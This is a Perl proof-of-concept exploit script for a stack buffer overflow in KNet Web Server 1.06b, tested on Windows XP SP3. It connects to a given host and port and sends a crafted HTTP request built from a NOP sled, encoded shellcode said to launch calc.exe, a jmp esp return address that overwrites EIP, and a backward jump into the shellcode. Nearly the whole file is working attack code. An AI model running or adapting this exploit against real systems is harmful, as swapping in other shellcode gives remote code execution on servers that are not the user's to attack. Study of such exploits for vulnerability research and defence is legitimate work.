#!/usr/bin/perl
# KNet Web Server Stack corruption BoF PoC
# Written by Wireghoul - http://www.justanotherhacker.com
# Date: 2013/04/11
# Software Link: http://www.exploit-db.com/wp-content/themes/exploit/applications/e16d7fb0fcbaab7ad5f2408bc2006394-KNet.exe
# Version: 1.06b
# Tested on: WinXP SP3

use IO::Socket::INET;
$host = shift;
$port = shift;
print "KNet Web Server stack corruption BoF PoC - Wireghoul - http://www.justanotherhacker.com\n";
die "Usage $0 <host> <port>\n" unless $host && $port;
$sock = IO::Socket::INET->new("$host:$port") or die "Unable to connect to $host:$port\n";

# Shellcode for calc.exe
$shellcode=
"\x89\xe2\xda\xd5\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x6b\x4c\x78\x68\x4e\x69\x45\x50\x73\x30" .
"\x63\x30\x61\x70\x6e\x69\x78\x65\x75\x61\x39\x42\x62\x44" .
"\x6c\x4b\x51\x42\x34\x70\x4e\x6b\x72\x72\x46\x6c\x4e\x6b" .
"\x71\x42\x37\x64\x4e\x6b\x44\x32\x36\x48\x54\x4f\x4e\x57" .
"\x53\x7a\x35\x76\x76\x51\x39\x6f\x44\x71\x4b\x70\x4e\x4c" .
"\x77\x4c\x35\x31\x73\x4c\x47\x72\x64\x6c\x67\x50\x4a\x61" .
"\x78\x4f\x54\x4d\x33\x31\x68\x47\x49\x72\x6a\x50\x73\x62" .
"\x63\x67\x6c\x4b\x52\x72\x66\x70\x6e\x6b\x53\x72\x77\x4c" .
"\x63\x31\x48\x50\x6e\x6b\x73\x70\x64\x38\x6e\x65\x69\x50" .
"\x52\x54\x50\x4a\x65\x51\x48\x50\x56\x30\x4c\x4b\x70\x48" .
"\x47\x68\x4c\x4b\x42\x78\x37\x50\x66\x61\x78\x53\x39\x73" .
"\x77\x4c\x57\x39\x4c\x4b\x75\x64\x4c\x4b\x77\x71\x38\x56" .
"\x70\x31\x59\x6f\x76\x51\x39\x50\x6c\x6c\x6f\x31\x6a\x6f" .
"\x34\x4d\x53\x31\x78\x47\x45\x68\x79\x70\x42\x55\x6b\x44" .
"\x77\x73\x61\x6d\x59\x68\x47\x4b\x51\x6d\x34\x64\x62\x55" .
"\x4d\x32\x31\x48\x4c\x4b\x71\x48\x47\x54\x37\x71\x4e\x33" .
"\x43\x56\x4e\x6b\x76\x6c\x32\x6b\x6c\x4b\x70\x58\x57\x6c" .
"\x36\x61\x79\x43\x6e\x6b\x73\x34\x6e\x6b\x33\x31\x4a\x70" .
"\x4b\x39\x73\x74\x34\x64\x54\x64\x63\x6b\x31\x4b\x65\x31" .
"\x33\x69\x72\x7a\x70\x51\x39\x6f\x69\x70\x70\x58\x31\x4f" .
"\x52\x7a\x6c\x4b\x36\x72\x58\x6b\x6b\x36\x73\x6d\x63\x5a" .
"\x55\x51\x4c\x4d\x6b\x35\x6c\x79\x35\x50\x63\x30\x65\x50" .
"\x66\x30\x35\x38\x46\x51\x6e\x6b\x50\x6f\x4c\x47\x79\x6f" .
"\x6e\x35\x4d\x6b\x5a\x50\x68\x35\x6f\x52\x62\x76\x42\x48" .
"\x6f\x56\x6d\x45\x4f\x4d\x6f\x6d\x4b\x4f\x7a\x75\x75\x6c" .
"\x66\x66\x31\x6c\x74\x4a\x6f\x70\x79\x6b\x4b\x50\x52\x55" .
"\x53\x35\x6d\x6b\x50\x47\x36\x73\x42\x52\x52\x4f\x72\x4a" .
"\x45\x50\x72\x73\x6b\x4f\x6b\x65\x30\x63\x33\x51\x52\x4c" .
"\x50\x63\x64\x6e\x51\x75\x42\x58\x45\x35\x57\x70\x41\x41";

$dist=1003-length($shellcode);
$payload = "\x90"x$dist; # Distance to overwrite EIP
$payload.=$shellcode;
$payload.="\x90" x 8; #Spacer between EIP and shellcode
$payload.= "\x53\x93\x42\x7e"; #Overwrite EIP with jmp esp
$payload.="\x90\x90\x90\x90\xE9\xF4\xFC\xFF\xFF"; #stack padding + BP + Near jmp-300
$payload.=" / HTTP/1.0\r\n\r\n"; # Needs to be a valid HTTP request

print $sock $payload;
